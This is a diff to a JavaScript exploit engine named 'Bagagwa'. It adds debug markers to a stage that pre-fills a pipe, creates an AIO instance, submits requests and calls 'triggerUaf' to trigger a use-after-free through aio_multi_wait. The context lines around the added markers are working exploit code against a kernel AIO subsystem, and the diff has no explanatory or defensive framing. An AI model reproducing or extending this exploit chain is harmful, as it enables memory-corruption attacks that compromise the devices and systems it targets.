@@ -571,6 +571,7 @@ export function makeBagagwaEngine(X) {
         w32(pipeBuf.u8, 0, 0); w32(pipeBuf.u8, 4, 0);
         const pipeR = await sys(SYS_PIPE2, pipeBuf.base, 0);
         if (pipeR.failed) { out.why = "pipe2 for AIO failed: " + pipeR.errText; return out; }
+        flushMark("BAGAGWA-S0-PIPE", "r=" + (r32(pipeBuf.u8, 0) | 0));
         S.aioRfd = r32(pipeBuf.u8, 0) | 0;
         S.aioWfd = r32(pipeBuf.u8, 4) | 0;
         track(S.aioRfd); track(S.aioWfd);
@@ -583,20 +584,25 @@ export function makeBagagwaEngine(X) {
         for (let j = 0; j < fillSize; j++) fillBuf.u8[j] = 0x41;
         const fillR = await sys(SYS_WRITE, S.aioWfd, fillBuf.base, fillSize);
         if (fillR.failed) { out.why = "pipe fill: " + fillR.errText; return out; }
+        flushMark("BAGAGWA-S0-FILL", "bytes=" + fillSize);
         out.steps.push("pipe pre-filled " + fillSize + "B (reads complete immediately)");
 
         const ci = await createAioInstance();
         if (!ci.ok) { out.why = ci.why; return out; }
+        flushMark("BAGAGWA-S0-CREATE", "id=" + ci.id);
         out.steps.push("AIO instance created: " + ci.id);
 
         const dataBuf = alloc(64, "aio-data");
         for (let i = 0; i < numRequests; i++) {
             const sr = await submitAioRequest(ci.id, dataBuf.base, 64, S.aioRfd, i64(0, 0));
             if (!sr.ok) { out.why = sr.why; return out; }
+            flushMark("BAGAGWA-S0-SUBMIT", "i=" + i + "-id=" + sr.reqId);
             out.steps.push("AIO request " + i + " submitted: id=" + sr.reqId);
         }
 
+        flushMark("BAGAGWA-S0-TRIGGER-PRE", "n=" + numRequests);
         const uafR = await triggerUaf(numRequests);
+        flushMark("BAGAGWA-S0-TRIGGER-POST", "ret=" + uafR.ret);
         out.steps.push("aio_multi_wait mode 0 returned: " + uafR.ret);
 
         if (!S.uafTriggered) {
